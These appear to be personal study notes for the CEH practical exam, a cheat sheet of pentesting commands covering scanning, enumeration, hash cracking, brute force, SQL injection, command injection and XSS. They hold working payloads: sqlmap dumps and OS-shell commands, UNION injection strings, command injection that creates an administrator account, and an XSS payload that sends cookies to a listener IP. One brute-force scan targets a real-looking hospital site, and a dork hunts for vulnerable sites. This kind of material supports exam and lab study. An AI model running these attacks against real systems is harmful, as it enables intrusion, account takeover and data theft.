# My ceh practical notes
#  Scanning Networks (always do sudo su)
```
1- Nmap scan for alive/active hosts command for 192.189.19.18- nmap -A 192.189.19.0/24 or nmap -T4 -A ip
2- Zenmap/nmap command for TCP scan- First put the target ip in the Target: and then in the Command: put this command- nmap -sT -v 10.10.10.16
3- Nmap scan if firewall/IDS is opened, half scan- nmap -sS -v 10.10.10.16 
If even this the above command is not working then use this command-  namp -f 10.10.10.16
4- -A command is aggressive scan it includes - OS detection (-O), Version (-sV), Script (-sS) and traceroute (--traceroute).
5- Identify Target system os with (Time to Live) TTL and TCP window sizes using wireshark- Check the target ip Time to live value with protocol ICMP. If it is 128 then it is windows, as ICMP value came from windows. If TTL is 64 then it is linux. Every OS has different TTL. TTL 254 is solaris.
6- Nmap scan for host discovery or OS- nmap -O 192.168.92.10 or you can use nmap -A 192.168.92.10
7- If host is windows then use this command - nmap --script smb-os-discovery.nse 192.168.12.22 (this script determines the OS, computer name, domain, workgroup, time over smb protocol (ports 445 or 139).
8- nmap command for source port manipulation, in this port is given or we use common port-  nmap -g 80 10.10.10.10
```
# Enumeration
```
1- NetBios enum using windows- in cmd type- nbtstat -a 10.10.10.10 (-a displays NEtBIOS name table)
2- NetBios enum using nmap- nmap -sV -v --script nbstat.nse 10.10.10.16
3- SNMP enum using nmap-  nmap -sU -p 161 10.10.10.10 (-p 161 is port for SNMP)--> Check if port is open
                          snmp-check 10.10.10.10 ( It will show user accounts, processes etc) --> for parrot
4- DNS recon/enum-  dnsrecon -d www.google.com -z
5- FTP enum using nmap-  nmap -p 21 -A 10.10.10.10 
6- NetBios enum using enum4linux- enum4linux -u martin -p apple -n 10.10.10.10 (all info)
				  enum4linux -u martin -p apple -P 10.10.10.10 (policy info)
```

# RDP Access
```
To login RDP
	User name; Password

Command to find Users Accounts
	net user

```

#  Stegnography --> Snow , Openstego, Hash Calc, VeraCrypt, BCTextEncoder
```
1- Hide Data Using Whitespace Stegnography- snow -C -m "My swiss account number is 121212121212" -p "magic" readme.txt readme2.txt  (magic is password and your secret is stored in readme2.txt along with the content of readme.txt)
2- To Display Hidden Data- snow -C -p "magic" readme2.txt (then it will show the content of readme2.txt content)
3- Image Stegnography using Openstego- PRACTICE ??
	- https://github.com/syvaidya/openstego/releases

VeraCrypt
	- https://www.veracrypt.fr/en/Downloads.html
	- Tutorial
		- https://veracrypt.eu/en/Beginner%27s%20Tutorial.html
		- https://westoahu.hawaii.edu/it/ask-us/security/3612/

Cracking Hashes
	- https://hashes.com/en/decrypt/hash
	- https://crackstation.net/

BCTextEncoder

1. Finde the Secret File.

	-----BEGIN ENCODED MESSAGE-----
	Version: BCTextEncoder Utility v. 1.00.7
	
	wy4ECQMCBT7mDgJPUqZgEN84FliE1dOrf7ak4qZLSON/usAbINzBaKJNpQCCDCCc
	0jkBJZ/ZS2J0khqeDfN/7UiapxfksqSs4CH1eawz7BSbpxRLjK42dsMwf4g8n+ps
	xHOAU3TdJD5SpnQ=
	-----END ENCODED MESSAGE-----

2. Decode Message with Password


CrypTool
	-https://www.cryptool.org/en/ct1/downloads

	Decrypt
		1. Encrypt/Decrypt > Symmetric (modern) > DES (ECB)
		2. Encrypt/Decrypt > Symmetric (modern) > RC4 > Key lenght (14)
	

```
#  Sniffing
```
1- Password Sniffing using Wireshark- In pcap file apply filter: http.request.method==POST (you will get all the post request) Now to capture password click on edit in menu bar, then near Find packet section, on the "display filter" select "string", also select "Packet details" from the drop down of "Packet list", also change "narrow & wide" to "Narrow UTF-8 & ASCII", and then type "pwd" in the find section.
```
#  Hacking Web Servers
```
1- Footprinting web server Using Netcat and Telnet- nc -vv www.movies.com 80
						    GET /HTTP/1.0
						    telnet www.movies.com 80
						    GET /HTTP/1.0
2- Enumerate Web server info using nmap-  nmap -sV --script=http-enum www.movies.com
3- Crack FTP credentials using nmap-  nmap -p 21 10.10.10.10 (check if it is open or not)
				      ftp 10.10.10.10 (To see if it is directly connecting or needing credentials)
Then go to Desktop and in Ceh tools folder you will find wordlists, here you will find usernames and passwords file.
Now in terminal type-  hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://10.10.10.10

hydra -l user -P passlist.txt ftp://10.10.10.10
```
#  Hacking Web Application
```
1- Scan Using OWASP ZAP (Parrot)- Type zaproxy in the terminal and then it would open. In target tab put the url and click automated scan.
2- Directory Bruteforcing- gobuster dir -u 10.10.10.10 -w /home/attacker/Desktop/common.txt
3- Enumerate a Web Application using WPscan & Metasploit BFA-  wpscan --url http://10.10.10.10:8080/NEW --enumerate u  (u means username) 
Then type msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wordpress_login_enum
 						 show options
						 set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
						 set RHOSTS 10.10.10.10  (target ip)
						 set RPORT 8080          (target port)
						 set TARGETURI http://10.10.10.10:8080/
						 set USERNAME admin
4- Brute Force using WPscan -    wpscan --url http://10.10.10.10:8080/NEW -u root -P passwdfile.txt (Use this only after enumerating the user like in step 3)
			         wpscan --url http://10.10.10.10:8080/NEW --usernames userlist.txt, --passwords passwdlist.txt 
5- Command Injection-  | net user  (Find users)
 		       | dir C:\  (directory listing)
                       | net user Test/Add  (Add a user)
		       | net user Test      (Check a user)
		       | net localgroup Administrators Test/Add   (To convert the test account to admin)
		       | net user Test      (Once again check to see if it has become administrator)
Now you can do a RDP connection with the given ip and the Test account which you created.
```
#  SQL Injections
```
https://medium.com/@hashsleuth.info/how-to-exploit-dvwa-blind-sql-injection-sqli-with-sqlmap-and-burp-suite-e4b3f08a0dfc
https://medium.com/@rafaelrenovaci/dvwa-solution-sql-injection-blind-sqlmap-cd1461ad336e

1- Auth Bypass-
	hi'OR 1=1 --
2- Insert new details if sql injection found in login page in username tab enter-
	blah';insert into login values('john','apple123');--
3- Exploit a Blind SQL Injection- In the website profile, do inspect element and in the console tab write -  document.cookie 
Then copy the cookie value that was presented after this command. Then go to terminal and type this command,
	sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --dbs
4- Command to check tables of database retrieved
	sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename --tables
5- Select the table you want to dump
	sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename -T Table_Name --dump   (Get username and password)
6- For OS shell this is the command
	sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --os-shell
6.1 In the shell type-   TASKLIST  (to view the tasks)
6.2 Use systeminfo for windows to get all os version
6.3 Use uname -a for linux to get os version

a' order by 1-- -
a' order by 2-- -
a' order by 3-- -
a' order by 4-- -
a' order by 5-- -
a' order by 6-- -
a' order by 7-- -
a' order by 8-- -

a' union select 1,2,3,database(),4,5,6-- -
a' union select 1,2,3,table_name,4,5,6 from information_schema.tables-- -
a' union select 1,2,3,table_name,4,5,6 from information_schema.tables where table_name like 'u%'-- -  [Busca a tabela que comece um a leta U]
a' union select 1,2,3,table_name,4,5,6 from information_schema.tables where table_schema=database()-- -
a' union select 1,2,3,column_name,4,5,6 from information_schema.columns where table_name='users'-- -
a' union select 1,2,login,password,4,5,6 from users-- - 
a' union select 1,2,group_concat(login,password),4,5,6,7 from users-- -
a' union select 1,2,concat_ws('<-->',login,password,id),3,4,5,6 from users-- -

Union select 'abc' FROM dual--
https://0ab7002a042b241e98520d250098005d.web-security-academy.net/filter?category=Pets'+UNION+SELECT+'Pets','def'+FROM+dual--
https://0ab7002a042b241e98520d250098005d.web-security-academy.net/filter?category=Pets'+UNION+SELECT+BANNER,NULL+FROM+v$version--
'+UNION+SELECT+'abc','def'+FROM+dual--
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```
# Android
```
1- nmap ip -sV -p 5555    (Scan for adb port)
2- adb connect IP:5555    (Connect adb with parrot)
3- adb shell              (Access mobile device on parrot)
4- pwd --> ls --> cd sdcard --> ls --> cat secret.txt (If you can't find it there then go to Downloads folder using: cd downloads)

https://developer.android.com/studio/command-line/adb
https://gist.github.com/Pulimet/5013acf2cd5b28e55036c82c91bd56d8
https://devhints.io/adb
https://3os.org/android/adb-cheat-sheet/#pulls-a-file-from-android-device

		Basics
adb devices	Lists connected devices
adb devices -l	Lists connected devices and kind
adb root	Restarts adbd with root permissions
adb start-server	Starts the adb server
adb kill-server	Kills the adb server
adb remount	Remounts file system with read/write access
adb reboot	Reboots the device
adb reboot bootloader	Reboots the device into fastboot
adb disable-verity	Reboots the device into fastboot

		Remote Shell
adb shell <command>	Runs the specified command on device (most unix commands work here)
adb shell wm size	Displays the current screen resolution
adb shell wm size WxH	Sets the resolution to WxH
adb shell pm list packages	Lists all installed packages
adb shell pm list packages -3	Lists all installed 3rd-party packages
adb shell monkey -p app.package.name	Starts the specified package

via USB
./adb tcpip 5555
./adb connect 192.168.43.117:5555
./adb devices
./adb  -d shell (Direct an adb command to the only attached USB device)
ls
cd sdcard
ls
cd dcim
cd camera
ls
./adb   push                C:\platform-tools\ota.zip /sdcard/Download           (from pc to android)
 <            pc location   >                  <android location>
 
./adb   pull     /sdcard/Download/magisk_patched.img       C:\platform-tools            (from android to pc)
 <            android location   >                      <pc location>

Entropy
	apt-get install ent
	ent -h
	ent evil.elf
		-> Entropy =  3.1324653
	
	sha384sum eveil.elf
		-> c7b24553683500c43eb6047af0f1bb25f8a19b16a72230ad5006f1c5cb5c7ad3e963554f9d2bf144e12b28745bf06347

	Copy only 4 last word for hash
		-> c7b24553683500c43eb6047af0f1bb25f8a19b16a72230ad5006f1c5cb5c7ad3e963554f9d2bf144e12b28745bf0 (6347)

```
# Wireshark
```
tcp.flags.syn == 1 and tcp.flags.ack == 0    (How many machines) or Go to statistics IPv4 addresses--> Source and Destination ---> Then you can apply the filter given
tcp.flags.syn == 1   (Which machine for dos)
http.request.method == POST   (for passwords) or click tools ---> credentials

https://wiki.wireshark.org/CaptureFilters
```
# Find FQDN
```
nmap -p389 –sV -iL <target_list>  or nmap -p389 –sV <target_IP> (Find the FQDN in a subnet/network)

FQDN = Host + Domain
	Host: DC
	Domain: pentest.com
	FQDN = DC.pentest.com
```
# Cracking Wi-Fi networks
```
Cracking Wifi Password
aircrack-ng [pcap file] (For cracking WEP network)
aircrack-ng -a2 -b [Target BSSID] -w [password_Wordlist.txt] [WP2 PCAP file] (For cracking WPA2 or other networks through the captured .pcap file)

```
#  Some extra work 
```
Check RDP enabled after getting ip- nmap -p 3389 -iL ip.txt | grep open (ip.txt contains all the alive hosts from target subnet)
Check MySQL service running- nmap -p 3306 -iL ip.txt | grep open        (ip.txt contains all the alive hosts from target subnet)

telnet
	user: root
	password:
ftp
	user: anonymous
	password:
ftp
	get
	mget

How many machines are active in a network - net discover -i 192.168.1.0/24
Connect to RDP via cmd - mstsc 
Find DNS records - https://www.nslookup.io/
Scan the whole website- (skipfish -o /root/test -S /usr/share/skipfish/dictionaries/complete.wl http://10.10.10.10:8080)
-o output
-S wordlist 
To brute force directories or files-
robuster dir  -u 10.10.10.10  -w /usr/share/dirb/wordlists/common.txt  -x  .txt
 OR
uniscan -u http://10.10.10.12:8080/CEH -q   (for directories)
uniscan –u http://10.10.10.12:8080/CEH -we (enable file check like robots.txt and sitemap.xml)
To get the file from the server- get http://10.10.10.10/secret.txt 
FTP Login - ftp <ip>
get <file name>   (to get file from FTP login)
SSH Login - SSH username@10.10.10.10
Nmap scan
Nmap  -A 10.10.10.10  (aggressive scan- Traceroute, T4, OS)
nmap  -sC  (service scan)
nmap -sV  (version scan)
nmap  -sP 10.10.10.10/24  (how many hosts are up in the whole network)/ping scan
nmap  -sL  (hostnames)
nmap  -oN <filename>  (to save output in a file)
nmap  -F  (fast scan)
nmap  -O  (os scan)
 
Crack the hashes-
hashid  -m <hash>  (to identify the type of hash, its mode etc)
hashcat  -m <mode>  -a 0  <hashhhhhhhh> /usr/share/wordlist/rockyou.txt
crackstation
hashes.com
Cyberchef
Enumeration-
Global network inventory
Netbios enumerator
Hyena
Superscan
Advanced ip scanner
 nmap smb scripts-
nmap --script smb-os-discovery.nse -p445 <ip>  (enumerate os, domain name,etc)
nmap --script smb-enum-users.nse -p445 <ip>  (used to enumerate all users on remote Windows system using SAMR enumeration and LSA bruteforcing)
nmap -p 445 --script=smb-enum-shares.nse, smb-enum-users.nse 10.10.19.21 (smb users and shares)
smbclient //10.10.19.21/anonymous  (accessing smb shares)
smbget -R smb://10.10.19.21/anonymous   (downloading smb files)
 enum4linux
enum4linux -u martin -p apple -U 10.10.10.12 | - u user -p pass -U get user list
enum4linux -u martin -p apple -o 10.10.10.12 | -o get OS info
enum4linux -u martin -p apple -P 10.10.10.12 | -P get password policy info
enum4linux -u martin -p apple -G 10.10.10.12 | -G get groups and members info
enum4linux -u martin -p apple -S 10.10.10.12 | -S get share list info
enum4linux -u martin -p apple -a 10.10.10.12 | -a get all simple enumeration data [-U -S -G -P -r -o -n -i]
 Wpscan
wpscan --url http://[IP Address]:8080/CEH --enumerate u  (enumerate the usernames stored in the website’s database)
Vulnerability analysis
nikto  -h  http://testphp.vulnweb.com/login.php -Tuning 1
Bruteforce-
Hydra  -L username  -P /usr/share/wordlists/rockyou.txt ftp://xiotz.com
Cryptography-
Hashcalc
Md5 calculator
Cryptool – decode .hex file
Bctextencoder – decrypt text using secret key
Veracrypt – anything related to volume
Crack hashes- hashes.com, cyberchef 
Steganography-
 Steghide  embed  -ef  <filename>  -cf  <image>  -p  <passphrase>
 Steghide  extract  -sf  <image>       (extract hidden data from image)
 Stegcracker  <image>  /usr/share/wordlists/rockyou.txt         (crack the passphrase of image)
  https://futureboy.us/stegano/decinput.html (online steganography tool)
 sha256sum <filename>   (find hash of the file)


```

# WPSCAN
```
User Enumeration : wpscan --url https://example/ --enumerate u
Bruteforce: wpscan --url https://example/ --passwords wordlist.txt --usernames samson
wpscan --url https://hospitalmarcelino.com.br -e at --random-user-agent --api-token LUj8CFzb3m3YffuwsKM1QFoNb5hU2PQOypc8q5V8Xhw --disable-tls-checks
```
# GREP
```
Apenas 4 primeiras letras -> grep -o '\b[a-z]\{4\}\b'

```

# Hash Cat
```
https://gitlab.com/kalilinux/packages/hash-identifier/-/tree/kali/master
https://crackstation.net/
https://hashcat.net/wiki/doku.php?id=example_hashes
https://www.tunnelsup.com/hash-analyzer/

Dictionary Attack
hashcat -m 0 -a 0 hash-1.txt /usr/share/wordlist/Rockyou/rockyou.txt --show

hashcat -m 0 -a 0 -o cracked.txt target_hashes.txt /usr/share/wordlists/rockyou.txt
  -m 0 designates the type of hash we are cracking (MD5);
  -a 0 designates a dictionary attack;
  -o cracked.txt is the output file for the cracked passwords;
  -target_hashes.txt is our input file of hashes;
  -/usr/share/wordlists/rockyou.txt = Path to the wordlist
 
 m - 0:MD5
     100:SHA1
     1400:SHA256
     1700:SHA512
     900:MD4
     3200:BCRYPT

Also Important to check hash
#hash-identifier
#hash -m [file]
```

# Hydra
```
FOR FTP
If username is already given = hydra -l samson -P -P /usr/share/wordlists/rockyou.txt 192.168.1.101 ftp
If password is given and needs to find username = hydra -L user.txt -p 123 192.168.1.101 ftp
If both username and password is not given = hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.101 ftp
Reference = https://www.hackingarticles.in/comprehensive-guide-on-hydra-a-brute-forcing-tool/

FOR SSH
hydra -L /usr/share/wordlists.rockyou.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.101 -t 4 ssh

FOR HTTP FORM
hydra -L [user] -P [password] [IP] http-post-form "/:usernam=^USER^ & password=^PASS^:F=incorrect" -V
```
# John
```
https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats

john --list=formats 
john --list=formats | grep -iF "md5"

john --format=Raw-SHA1-AxCrypt --wordlist=/usr/share/wordlists/rockyou.txt hash2.txt
_____
Unshadow Mode

FILE 1 - local_passwd
Contains the /etc/passwd line for the root user:
root:x:0:0::/root:/bin/bash

FILE 2 - local_shadow
Contains the /etc/shadow line for the root user:
root:$6$2nwjN454g.dv4HN/$m9Z/r2xVfweYVkrr.v5Ft8Ws3/YYksfNwq96UL1FX0OJjY1L6l.DS3KEVsZ9rOVLB/ldTeEL/OIhJZ4GMFMGA0:18576::::::

unshadow local_passwd local_shadow > unshadowed.txt
______
Single crack mode: john --single --format=raw-sha1 crack.txt
Crack the password in file using wordlist: john --wordlist=/usr/share/john/password.lst --format=raw-sha1 crack.txt (Crack.txt here contains the hashes)

Create a wordlist of Single Crack Mode file

From
1efee03cdcb96d90ad48ccc7b8666033
To
Joker:1efee03cdcb96d90ad48ccc7b8666033

john --single --format=Raw-MD5 hash7.txt 
______
Create Custom Rules

Custom rules are defined in the john.conf file,
usually located in /etc/john/john.con

https://www.openwall.com/john/doc/RULES.shtml

[List.Rules:THMRules]
______
Cracking service credentials like ssh
1. First have to convert the hash file to JOHN format : ssh2john /home/text/.ssh/id_rsa > crack.txt (Now we need to crack this crack.txt file with John The Ripper)
2. john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt

To crack ZIP
1. zip2john file.zip > crack.txt
2. john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt

To crack RAR
1. rar2john rarfile.rar > rar_hash.txt
2. john --wordlist=/usr/share/wordlists/rockyou.txt rar_hash.txt

unrar e secure.rar

Notes:
–wordlist can be written as -w also
john crack.txt --wordlist=rockyou.txt --format=Raw-SHA256
```
# NMAP
```
nmap -sV -sC -oA nmap.txt 10.10.10.x
nmap -sC -sV -v -oN nmap.txt 10.10.10.x
nmap -sS -P0 -A -v 10.10.10.x
masscan -e tun0 -pi-65535 --rate=1000
nmap -sU -sV -A -T4 -v -oN udp.txt 10.10.10.x
```
# SQLMAP
```
URL = http://testphp.vulnweb.com/artists.php?artist=1
Find DBs = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch
Result is DB name acuart
Find Tables = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --table --batch
Result is table name users
Find columns = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns --batch
Dump table = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump --batch
Dump the DB = sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --dump-all --batch

Reference = https://www.hackingarticles.in/database-penetration-testing-using-sqlmap-part-1/
Using cookies
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --cookie='JSESSIONID=09h76qoWC559GH1K7DSQHx' --random-agent --level=1 --risk=3 --dbs --batch

SQL Injection
in login page enter blah' or 1=1-- as username and click login without entering the password
OS Shell = sqlmap -u 'url' --dbms=mysql --os-shell
SQL Shell = sqlmap -u 'url' --dbms=mysql --sql-shell

sqlmap-
site:http://testphp.vulnweb.com/ php?= (for finding vulnerable site)
(for cookies- console->document.cookie)
 
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --dbs   (databases)
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart –tables   (tables)
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users --columns   (columns)
(dump whole table)
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users  --dump 
 OR 
(dump individual  column data)
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C uname  --dump 
sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users -C pass  --dump
```

# Wireshark
```
To find DOS (SYN and ACK) :
	tcp.flags.syn == 1  , tcp.flags.syn == 1 and tcp.flags.ack == 0

To find ARP Request and ARP Reply:
	arp.opcode == 1 or arp.opcode == 2

To find ICMP Request and ICMP Respose :
	icmp.type == 0 or icmp.type == 8

To find passwords :
	http.request.method == POST

To find ip address :
	ip.addr == <IP Address>
	ip.addr == 192.168.0.100

To find SRC and DST :
	ip.src == <SRC IP Address> and ip.dst == <DST IP Address>
	ip.addr == 192.168.0.100 and ip.src == ip.addr == 192.168.0.200

To find TCP Protocol :
	tcp.port eq <Port #> or <Protocol Name>
	tcp.port eq 80 or http

To find UDP Protocol :
	udp.port eq <Port #> or <Protocol Name>
	udp.port eq 53 or dns

To find Mac Address :
	arp.src.hw_mac == 80:fb:06:f0:45:d7

To find DNS Queries :
	dns.qry.name
	dns.qry.name == 8.8.8.8.in-addr.arpa

To find HTTP Queries :
	http.request.full_uri
	http.content_type


More reference: https://www.comparitech.com/net-admin/wireshark-cheat-sheet/
https://www.wireshark.org/docs/wsug_html_chunked/ChWorkBuildDisplayFilterSection.html

To find DOS: Look for Red and Black packets with around 1-2 simple packets in between and then pick any packet and check the Source and Destination IP with port(As per question)
```

# XSS
```
<script>alert(20)</script>

cd/var/www/html

vim vinicius_clemente.html

	XSS feito com sucesso
	:wq

ifconfig eth0 (pega o ip)

192.168.198.200/vinicius_clemente.html

<iframe src="http://192.168.198.200/vinicius_clemente_teste.php" style="width:1200px; wigth:200px"></iframe>

----- XSS JSON
aa<script>alert(10)</script>bb
"}]}';alert(10)</script>


---- XSS AJAX/JSON
<img src=a onerror=alert(10)>

---- XSS AJAX/XML
&lt;img src=a onerror=alert(10)&gt;

---- XSS USER-AGENT
GET /bWAPP/xss_user_agent.php HTTP/1.1
Host: 10.21.3.4
User-Agent: <script>alert(10)</script>

---- XSS EVAL
http://10.21.3.4/bWAPP/xss_eval.php?date=alert(10)

---- XSS HREF
http://10.21.3.4/bWAPP/xss_href-2.php?name=><script>alert(10)</script>

	
							-- XSS STORED -- DVWA
<script>alert("asdfasdfasdf

<script>document.write('<img src="http://192.168.198.200:36200/?'+document.cookie+'"/>');</script>

<script>document.write
('
	<img 
		src="
			http://192.168.198.200:36894/?'+document.cookie+'
		    "
	/>
');
</script>

OPEN PORT IN KALI
socat TCP-Listen:36894 -

-------------- MULTILIDAE II - OWASP 2017 -> A7 -> VIA INPUT -> ADD TO YOUR BLOG
<b> 
<script>document.write(\'<img src="http://192.168.198.200:36200/?\'+document.cookie+\'"/>\');</script>
</b>

							-- CSRF -- 
<img src="/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change#">
```

# Command Injection
```
27.0.0.1; ls
127.0.0.1 &;cat /etc/passwd
127.0.0.1|cat /etc/passwd

FILE UPLOAD
http://10.21.3.4/hackable/uploads/img01.php?cmd=cat /etc/passwd


LFI - Local File Inclusion
http://10.21.3.4/vulnerabilities/fi/?page=/etc/passwd
http://10.21.3.4/vulnerabilities/fi/?page=file:///etc/passwd

RFI - Remote File Inclusion
file = vinicius_clemente.txt

<?php phpinfo(); ?>
http://10.21.3.4/vulnerabilities/fi/?page=http://192.168.198.200/vinicius_clemente.txt

```

# Fuff
```
A fast web fuzzer written in Go

GET parameter fuzzing
	ffuf -w /path/to/paramnames.txt -u https://target/script.php?FUZZ=test_value -fs 4242

POST data fuzzing
	ffuf -w /path/to/postdata.txt -X POST -d "username=admin\&password=FUZZ" -u https://target/login.php -fc 401

HOST HEADER
	ffuf -u https://hackycorp.com -t 100 -H "Host: FUZZ.hackycorp.com" -w /usr/share/wordlist/SecLists/Discovery/DNS/fierce-hostlist.txt -fs 107
	
```

# Curl
```
	-I, --head: Fetch the headers only
		curl -I https://hackycorp.com

	-X, --request: Change the method to use when starting the transfer
		curl -X GET https://hackycorp.com
		curl -X "DELETE" https://example.com
 		curl -X NLST ftp://example.com/

	
	-H, --header: Extra header to include in information sent. When used within an HTTP request, it is added to the regular request headers
		curl -H "X-First-Name: Joe" https://example.com
 		curl -H "User-Agent: yes-please/2000" https://example.com
 		curl -H "Host:" https://example.com
 		curl -H @headers.txt https://example.com
		for i in $(cat "/usr/share/wordlist/SecLists/Discovery/DNS/fierce-hostlist.txt"); do curl -H "Host: $i.hackycorp.com" https://hackycorp.com; done

```

# dig
```
DNS lookup utility

dig @server name type
	dig @51.158.147.132 key.z.hackycorp.com TXT

Zone Transfer
	1. dig z.hakcycorp.com ns
	2. dig @ns1.hackycorp.com z.hackycorp.com axfr

Zone Transfer on the internal zone named "int"
	1. dig int @51.158.147.132 axfr

	int.                    604800  IN      SOA     int. internals. 2 604800 86400 2419200 604800
	int.                    604800  IN      NS      int.
	int.                    604800  IN      A       127.0.0.1
	recon_15.int.           604800  IN      TXT     "b55b45a8-63b1-42f7-bd12-a36219ff883d"
	int.                    604800  IN      SOA     int. internals. 2 604800 86400 2419200 604800

Find the version of Bind used
	1. nslookup -q=txt -class=CHAOS version.bind z.hackycorp.com
	2. dig -t txt -c chaos VERSION.BIND @51.158.147.132

	Server:         z.hackycorp.com
	Address:        51.158.147.132#53
	version.bind    text = "4e5e76e1-728a-49be-aea8-4591ba11e588"

	https://www.firewall.cx/operating-systems/linux-unix/linux-bind-introduction.html
	https://packetpushers.net/blog/turning-bind-dns-management-into-a-walk-in-the-park/
```

